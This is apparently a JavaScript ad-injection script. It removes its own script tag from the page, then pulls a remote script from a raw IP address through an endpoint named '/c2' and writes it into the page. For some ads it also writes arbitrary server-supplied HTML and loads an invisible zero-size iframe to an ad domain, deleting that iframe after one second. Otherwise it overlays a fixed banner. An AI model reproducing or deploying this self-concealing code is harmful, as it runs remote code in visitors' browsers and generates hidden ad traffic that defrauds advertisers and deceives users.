var ts = new Date().getTime();
var c2_params_mobile = assembleC2Para_MOBILE();

var sc = document.getElementsByTagName("script");
var node = sc[sc.length - 1];
node.parentNode.removeChild(node);

var psurl = "http://180.96.26.130:8070/c2?" + c2_params_mobile;
document.write("<script type='text/javascript' src='" + psurl + "'><\/script>");
var ainfo = "";
function psda(resobj) {
	ainfo = resobj;

	if (ainfo.showFlag == "0") {
		recordShow("1", ainfo.adId, ainfo.ref);
	} else {
		adShow(ainfo.width, ainfo.height, ainfo.userId, ainfo.adId, ainfo.ref);
	}
}

function recordShow(showType, adId, ref) {

	var timestamp = new Date().getTime();
	var click_img = new Image(1, 1);
	click_img.src = "http://180.96.26.130:8070/showad?showType=" + showType
			+ "&ref=" + ref + "&adId=" + adId + "&impId=" + ainfo.impId
			+ "&area=" + ainfo.area + "&_=" + timestamp;

}

function adShow(width, height, userId, adId, ref) {
	if (ainfo.linkType == "J") {
		document.write(ainfo.extLink);
		document
				.write('<iframe id="jframe"  src="http://ad.adtina.com/ad/'
						+ ainfo.userId
						+ '/'
						+ ainfo.adId
						+ '?adforcerReferer='
						+ ainfo.ref
						+ '&ad_acct='
						+ ainfo.adAcct
						+ '" width="0px" height="0px" border="0"   marginwidth="0" marginheight="0"  frameborder="0" hspace="0" scrolling="no" vspace="0" ></iframe>');

		var jframe = document.getElementById("jframe");
		setTimeout("jframe.parentNode.removeChild(jframe)", 1000);
		return;
	}

	document.write('<div id="addiv" style="position: fixed; Z-INDEX: 9200; left: 0px; bottom: 0px;width: 100%;height: 0px">');
	document.write('<img  src="http://static.sxite.com/static/image/banner_close.png" onclick="closeAdDiv();"  style="height:auto;float:right;width:5%;cursor:pointer;position:absolute;top:0;right:0">');

	if (ainfo.linkType == 'M') {
		document.write('<iframe id="adpage_m"  src="http://ad.adtina.com/ad/'
						+ ainfo.userId
						+ '/'
						+ ainfo.adId
						+ '?pk=1&adforcerReferer='
						+ ainfo.ref
						+ '&ad_acct='
						+ ainfo.adAcct
						+ '" width="100%" height="60px" border="0"   marginwidth="0" marginheight="0"  frameborder="0" hspace="0" scrolling="no" vspace="0" ></iframe>');
	} 
	document.write('</div>');
	
	
	 var h=window.innerWidth*ainfo.height;
     h=parseInt(h/ainfo.width);
     document.getElementById("adpage_m").height=h+"px";
     document.getElementById("addiv").style.height=h+"px";
}


function assembleC2Para_MOBILE() {
	var params = {};
	params.adforcerReferer = nullOrUndefined2Empt(src_url);
	params.rus = nullOrUndefined2Empt(rus);
	params.divda = nullOrUndefined2Empt(divda);
	params.ptey = nullOrUndefined2Empt(ptey);
	params.area = nullOrUndefined2Empt(area);
	params.rus = nullOrUndefined2Empt(rus);
	params.adType = "1";

	var timestamp = new Date().getTime();
	params.ts = timestamp || '';
	// 拼接参数串
	var args = '';
	for ( var i in params) {
		if (args != '') {
			args += '&';
		}
		args += i + '=' + encodeURIComponent(params[i]);
	}
	return args;

	return params;
}


function closeAdDiv() {
	document.getElementById("addiv").innerHTML = '';
	document.getElementById("addiv").style.visibility = 'hidden';
	document.getElementById("addiv").style.display = 'none';
}

function nullOrUndefined2Empt(str) {
	if (typeof (str) == "undefined" || str == null) {
		return "";
	} else {
		return str;
	}
}
